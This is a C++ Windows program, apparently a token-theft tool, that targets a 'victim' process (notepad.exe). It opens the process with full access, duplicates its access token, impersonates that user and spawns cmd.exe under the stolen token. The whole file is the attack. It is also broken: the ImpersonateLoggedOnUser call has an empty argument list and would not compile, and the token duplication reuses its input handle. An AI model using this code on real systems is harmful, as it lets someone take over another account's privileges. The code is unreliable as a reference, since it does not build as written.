#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <tlhelp32.h>
 
using namespace std;
 
int getPIDbyProcName(const char* procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
            if (strcmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}
 
int main(int argc, char* argv[]) {
    HANDLE hVictimProcess;
    HANDLE hToken;
    int victimPID;
    TOKEN_USER* tokenUser;
    DWORD tokenUserSize = 0;
 
    victimPID = getPIDbyProcName("notepad.exe");
    if (victimPID == 0) {
        cout << "Process not found" << endl;
        return 1;
    }
 
    // Impersonation User Process Token
 
    hVictimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victimPID);
    if (hVictimProcess == NULL) {
        cout << "OpenProcess failed" << endl;
        return 1;
    }
 
    if (!OpenProcessToken(hVictimProcess, TOKEN_ALL_ACCESS, &hToken)) {
        cout << "OpenProcessToken failed" << endl;
        return 1;
    }
 
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken)) {
        cout << "DuplicateTokenEx failed" << endl;
        return 1;
    }
 
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenUserSize)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            cout << "GetTokenInformation failed" << endl;
            cout << GetLastError() << endl;
            return 1;
        }
    }
 
    tokenUser = (TOKEN_USER*)new char[tokenUserSize];
 
    if (!GetTokenInformation(hToken, TokenUser, tokenUser, tokenUserSize, &tokenUserSize)) {
        cout << "GetTokenInformation failed" << endl;
        cout << GetLastError() << endl;
        delete[] (char*)tokenUser; 
        return 1;
    }
 
    if (!ImpersonateLoggedOnUser(  )) {
        cout << "ImpersonateLoggedOnUser failed" << endl;
        return 1;
    }
 
    cout << "Impersonation successful" << endl;
 
    //Process Execution
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
 
    if (!CreateProcessAsUser(hToken, NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        cout << "CreateProcessAsUser failed" << endl;
        cout << GetLastError() << endl;
        return 1;
    }
 
    cout << "Process created" << endl;
    delete[] (char*)tokenUser;
 
    return 0;
}